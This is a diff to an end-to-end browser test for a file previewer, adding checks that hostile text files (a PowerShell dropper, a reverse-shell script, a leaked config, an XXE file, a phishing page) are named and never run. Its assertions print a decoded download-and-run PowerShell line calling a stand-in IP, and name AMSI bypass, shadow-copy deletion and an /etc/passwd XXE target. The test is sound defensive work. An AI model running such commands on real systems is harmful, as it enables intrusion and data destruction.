@@ -55,13 +55,22 @@
  *     archive inside an archive in turn); a lure's every trick named; a
  *     password asked for, a wrong one refused, "infected" one click away
  *     and everything it opens a sample (saved only as one); a liar
- *     stopped; AZO named and not opened.
+ *     stopped; AZO named and not opened;
+ *   - text (42f): Markdown rendered and cleaned (no script, form, frame or
+ *     outside picture; a link that hovers true and clicks nowhere; Find in
+ *     it), its source a tab away; JSON and XML as trees with their paths;
+ *     a JSON nested to exhaust a parser and an XML with an outside entity
+ *     refused, and said why; a phishing page shown as source only; code
+ *     highlighted, wrapped on request; a dropper's every line named and
+ *     its hidden command decoded; a leaked config's keys named, masked; a
+ *     program named .js said to be binary; plain text kept in the page.
  */
 
 import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
 import { startDev } from "../api/_dev.mjs";
 import { seedLead } from "../lib/seed-lead.mjs";
+import { dropperPs1, installSh, leakedEnv } from "../lib/hostile-text.mjs";
 
 let chromium = null;
 try {
@@ -241,6 +250,13 @@ try {
 	consoleCsp.length = 0;
 	const rtf = fixture("hostile.rtf");
 	await page.locator("gorani-win11 [data-upload]").first().setInputFiles([
+		...["readme.md", "data.json", "deep.json", "events.jsonl", "config.xml", "xxe.xml", "page.html", "app.py"].map((name) => ({ name, mimeType: "application/octet-stream", buffer: fixture(name) })),
+		// (Built when the test runs — tests/lib/hostile-text.mjs.)
+		{ name: "dropper.ps1", mimeType: "text/plain", buffer: Buffer.from(dropperPs1) },
+		{ name: "install.sh", mimeType: "text/plain", buffer: Buffer.from(installSh) },
+		{ name: "prod.env", mimeType: "text/plain", buffer: Buffer.from(leakedEnv) },
+		{ name: "invoice.js", mimeType: "text/javascript", buffer: Buffer.from([0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0, 0x50, 0x45, 0, 0]) },
+		{ name: "field.log", mimeType: "text/plain", buffer: Buffer.from("09:00 gorani seen\n09:05 gorani gone\n") },
 		...["bundle.zip", "bundle.7z", "bundle.rar", "bundle.tar.gz", "bundle.iso", "korean.zip", "lure.zip", "infected.zip", "locked.7z", "liar.zip", "report.alz", "report.egg", "azo.egg"].map((name) => ({ name, mimeType: "application/octet-stream", buffer: fixture(name) })),
 		...["photo.jpg", "portrait.jpg", "redacted.jpg", "cropped.jpg", "polyglot.jpg", "generated.png", "bomb.png", "animated.gif", "photo.webp", "photo.avif", "scan.tiff", "photo.heic", "camera.dng", "camera.cr3", "camera.raf", "drawing.svg", "hostile.svg", "entities.svg"].map((name) => ({ name, mimeType: "application/octet-stream", buffer: fixture(name) })),
 		// Disguises: a JPEG named .png (a zero byte more, so the upload's
@@ -656,7 +672,8 @@ try {
 	await d.locator('[data-test="arc-path"]', { hasText: "docs" }).waitFor();
 	await rowOf(d, "notes.md").locator('[data-test="arc-open"]').click();
 	await page.locator('[data-test="viewer-name"]', { hasText: "bundle.zip › notes.md" }).waitFor({ timeout: 30_000 });
-	await page.getByText("- 고라니 (water deer)").waitFor({ timeout: 30_000 });
+	// (Markdown: rendered by the text reader, in a frame of its own — 42f.)
+	await page.frameLocator('iframe[data-preview="text"]').locator('[data-test="text-rendered"] li', { hasText: "고라니 (water deer)" }).waitFor({ timeout: 30_000 });
 	await page.locator('[data-test="viewer-back"]').click();
 	await page.locator('iframe[data-preview="archive"]').waitFor({ timeout: 30_000 });
 	await closeDoc();
@@ -758,6 +775,108 @@ try {
 	await d.locator('[data-test="arc-note"]', { hasText: "AZO" }).waitFor({ timeout: 30_000 });
 	await closeDoc();
 
+	// ── text (42f) ───────────────────────────────────────────────────────
+	const status = (dd) => dd.locator('[data-test="text-status"]');
+	// Markdown: rendered and cleaned; its raw HTML named, none of it drawn.
+	d = await openDoc("readme.md", "text");
+	const md = d.locator('[data-test="text-rendered"]');
+	await md.getByText("Gorani field notes").waitFor({ timeout: 30_000 });
+	await md.locator("td", { hasText: "North ridge" }).waitFor();
+	await md.locator("pre code", { hasText: 'print("counted")' }).waitFor();
+	assert.equal(await md.locator("script, form, input, iframe, object, embed").count(), 0, "no script, form or frame drawn");
+	assert.equal(await md.locator("img").evaluateAll((imgs) => imgs.filter((i) => !i.src.startsWith("data:")).length), 0, "no picture from outside, nor a relative one: placeholders");
+	tells = await factsSay(/Contains 2 scripts — not run: shown as cleaned text/);
+	for (const want of [/Contains 1 form — not drawn/, /Contains 1 frame — not drawn/, /Would load 2 things from outside \(not loaded\): https:\/\/tracker\.example\/pixel\.png/]) assert.match(tells, want);
+	const mapLink = md.getByRole("link", { name: "link to the map" });
+	await mapLink.hover();
+	await status(d).filter({ hasText: "→ https://maps.example/gorani" }).waitFor();
+	await mapLink.click();
+	await page.waitForTimeout(300);
+	assert.equal(await page.locator('iframe[data-preview="text"]').count(), 1, "a click goes nowhere: the frame is still here");
+	await d.locator('[data-test="find"]').fill("water deer");
+	await d.locator('[data-test="find"]').press("Enter");
+	await d.locator('[data-test="found"]', { hasText: "1 of 1" }).waitFor();
+	await d.locator('[data-test="text-tab-source"]').click();
+	await d.locator('[data-test="text-source"]', { hasText: "<script>alert('md script')</script>" }).waitFor();
+	await closeDoc();
+
+	// JSON: a tree, each value's path on a click; JSON Lines, a record a line.
+	d = await openDoc("data.json", "text");
+	const tree = d.locator('[data-test="text-tree"]');
+	await tree.locator(".k", { hasText: '"sites"' }).click();
+	await tree.locator(".k", { hasText: /^1$/ }).click();
+	await tree.getByText('"강가"').click();
+	await status(d).filter({ hasText: /^\$\.sites\[1\]\.name$/ }).waitFor();
+	await tree.locator(".k", { hasText: '"meta"' }).click();
+	await tree.locator(".k", { hasText: '"odd key"' }).click();
+	await status(d).filter({ hasText: '$.meta["odd key"]' }).waitFor();
+	await factsSay(/^JSON · 9 lines/m);
+	await closeDoc();
+	d = await openDoc("deep.json", "text");
+	await factsSay(/Not valid JSON: it nests deeper than 512 levels — not parsed/);
+	assert.equal(await d.locator('[data-test="text-tab-tree"]').count(), 0, "no tree: refused before JSON.parse saw it");
+	await d.locator('[data-test="text-source"]').waitFor();
+	await closeDoc();
+	d = await openDoc("events.jsonl", "text");
+	await factsSay(/3 records, 1 line not JSON/);
+	await d.locator('[data-test="text-tree"] .k', { hasText: /^2$/ }).waitFor();
+	await closeDoc();
+
+	// XML: a tree from an inert parse — unless it reaches outside, when it is not parsed at all.
+	d = await openDoc("config.xml", "text");
+	await d.locator('[data-test="text-tree"] .t', { hasText: "<settings" }).waitFor({ timeout: 30_000 });
+	await d.locator('[data-test="text-tree"] .v', { hasText: '"강가"' }).click();
+	await status(d).filter({ hasText: "/settings/site[2]" }).waitFor();
+	await closeDoc();
+	d = await openDoc("xxe.xml", "text");
+	tells = await factsSay(/XXE: how an XML parser is made to read a file or call out; not parsed/);
+	assert.match(tells, /“file:\/\/\/etc\/passwd”/);
+	assert.match(tells, /billion laughs/);
+	assert.equal(await d.locator('[data-test="text-tab-tree"]').count(), 0);
+	await closeDoc();
+
+	// A phishing page: its source, never the page.
+	d = await openDoc("page.html", "text");
+	await d.locator('[data-test="text-source"]', { hasText: '<form action="https://phish.example/login"' }).waitFor({ timeout: 30_000 });
+	assert.equal(await d.locator("form, iframe, input:not([data-test=find])").count(), 0, "none of the page drawn: only its source");
+	tells = await factsSay(/A web page \(shown as source, never as a page\)/);
+	for (const want of [/Contains 2 scripts/, /Contains 1 form/, /Would load 2 things from outside/]) assert.match(tells, want);
+	await closeDoc();
+
+	// Code: highlighted, numbered, wrapped on request.
+	d = await openDoc("app.py", "text");
+	await d.locator('.code .hljs-keyword', { hasText: "def" }).waitFor({ timeout: 30_000 });
+	assert.equal((await d.locator(".gutter").innerText()).split("\n").length, 19, "a number a line");
+	assert.equal(await factsSay(/Python source/), "Python source · 19 lines · 306 bytes · UTF-8", "honest code: one line of facts, no warning");
+	await d.locator('[data-test="text-wrap"]').click();
+	assert.equal(await d.locator(".gutter").isVisible(), false, "wrapped lines: the numbers would lie, so they hide");
+	await closeDoc();
+
+	// A dropper: every line named, its hidden command decoded.
+	d = await openDoc("dropper.ps1", "text");
+	tells = await factsSay(/Line 5 bypasses AMSI/);
+	for (const want of [/Line 3 downloads and runs code \(PowerShell\)/, /Line 4 runs PowerShell hidden and unrestricted/, /Line 4 hides a PowerShell command in base64 — decoded: “IEX \(New-Object Net\.WebClient\)\.DownloadString\('http:\/\/198\.51\.100\.9\/run\.ps1'\)”/, /Line 6 creates a scheduled task/, /Line 7 deletes shadow copies/, /Line 8 switches Windows Defender off/]) assert.match(tells, want);
+	await closeDoc();
+	d = await openDoc("install.sh", "text");
+	tells = await factsSay(/Line 3 opens a reverse shell/);
+	assert.match(tells, /Line 2 downloads and runs code \(shell\)/);
+	await closeDoc();
+	// A leaked config: each key named and masked — never spelled out outside the file.
+	d = await openDoc("prod.env", "text");
+	tells = await factsSay(/Holds what look like secrets/);
+	assert.match(tells, /AKIA…MPLE \(line 2\)/);
+	assert.doesNotMatch(tells, /IOSFODNN7|K7MDENG|Gorani-s3cret/);
+	await closeDoc();
+	// A program named .js: said to be binary, shown as characters.
+	d = await openDoc("invoice.js", "text");
+	await factsSay(/Its name says text, but it is binary/);
+	await closeDoc();
+	// Plain text needs no parser: it stays in the page, escaped.
+	await exact("field.log").dblclick();
+	await page.getByText("09:05 gorani gone").waitFor({ timeout: 30_000 });
+	assert.equal(await page.locator("iframe[data-preview]").count(), 0, "a log is not handed to a reader");
+	await page.keyboard.press("Escape");
+
 	// The details pane: a small picture, in a compact frame of its own.
 	await exact("photo.jpg").click();
 	await page.keyboard.press(" ");
@@ -855,7 +974,7 @@ try {
 		await phone.close();
 	}
 	await browser.close();
-	console.log("ok  e2e:preview — archives (ZIP, ALZ, EGG ours; 7z, RAR 5, TAR.GZ, ISO by 7-Zip) listed and walked, entries opened in previews of their own, a lure's tricks named, passwords asked and checked, 'infected' entries saved only as samples, a liar stopped, AZO named; pictures (JPEG, PNG, GIF, WebP, AVIF, TIFF pages, HEIF through libheif, DNG/CR3/RAF previews, SVG as a picture with its source) all in the frame, GPS named and copied, a redaction the thumbnail betrays, a crop, a polyglot, an AI mark, a bomb not drawn, disguises named, zoom/pan/pinch, the details pane's compact frame; email (.eml, .msg) with its facts, attachments opened in their own previews and one saved as a sample; Word, Excel, CSV, PowerPoint, 한글 (HWP, HWPX, a password), Word/PowerPoint 97, RTF, OpenDocument each drawn in the frame with its facts, every hostile file's tricks named and none run or fetched, disguised .doc files named, the default Trusted Types policy holding; the frame's own policy; a PDF drawn by pdf.js in an allow-scripts-only frame (pages, text, Korean through a CMap, search, facts), a hostile PDF's script never run and its link and attachment named; from inside the frame no cookie, storage, parent, API, network, popup or top navigation, and a frame that navigates is refused and closed; on a phone it fits and a swipe in the frame opens the next file");
+	console.log("ok  e2e:preview — text (Markdown rendered and cleaned, JSON and XML trees with paths, a deep JSON and an XXE refused, a page shown as source, code highlighted, a dropper's lines and hidden command named, a leaked config masked, a log kept in the page); archives (ZIP, ALZ, EGG ours; 7z, RAR 5, TAR.GZ, ISO by 7-Zip) listed and walked, entries opened in previews of their own, a lure's tricks named, passwords asked and checked, 'infected' entries saved only as samples, a liar stopped, AZO named; pictures (JPEG, PNG, GIF, WebP, AVIF, TIFF pages, HEIF through libheif, DNG/CR3/RAF previews, SVG as a picture with its source) all in the frame, GPS named and copied, a redaction the thumbnail betrays, a crop, a polyglot, an AI mark, a bomb not drawn, disguises named, zoom/pan/pinch, the details pane's compact frame; email (.eml, .msg) with its facts, attachments opened in their own previews and one saved as a sample; Word, Excel, CSV, PowerPoint, 한글 (HWP, HWPX, a password), Word/PowerPoint 97, RTF, OpenDocument each drawn in the frame with its facts, every hostile file's tricks named and none run or fetched, disguised .doc files named, the default Trusted Types policy holding; the frame's own policy; a PDF drawn by pdf.js in an allow-scripts-only frame (pages, text, Korean through a CMap, search, facts), a hostile PDF's script never run and its link and attachment named; from inside the frame no cookie, storage, parent, API, network, popup or top navigation, and a frame that navigates is refused and closed; on a phone it fits and a swipe in the frame opens the next file");
 } finally {
 	await dev.close();
 }
